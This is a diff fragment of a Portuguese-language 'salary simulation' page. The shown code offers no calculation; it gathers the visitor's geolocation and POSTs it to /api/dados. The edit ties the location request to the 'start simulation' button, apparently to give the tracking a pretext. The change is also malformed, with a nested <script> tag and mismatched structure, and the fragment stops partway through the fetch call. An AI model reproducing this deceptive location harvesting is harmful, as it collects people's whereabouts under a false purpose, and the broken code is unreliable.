@@ -83,20 +83,22 @@
       <div class="container">
         <h1>Simulação de Salário</h1>
         <p>Calcule seu salário e descubra resultados personalizados</p>
-        <button>Começar Simulação</button>
+        <button onclick="getLocation()">Começar Simulação</button>
       </div>
     </div>
   </div>
 
   <script>
     // Captura de geolocalização (se disponível) e envio dos dados para /api/dados
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            timestamp: new Date().toISOString()
+    <script>
+        function getLocation() {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                timestamp: new Date().toISOString()
           };
           fetch('/api/dados', {
             method: 'POST',
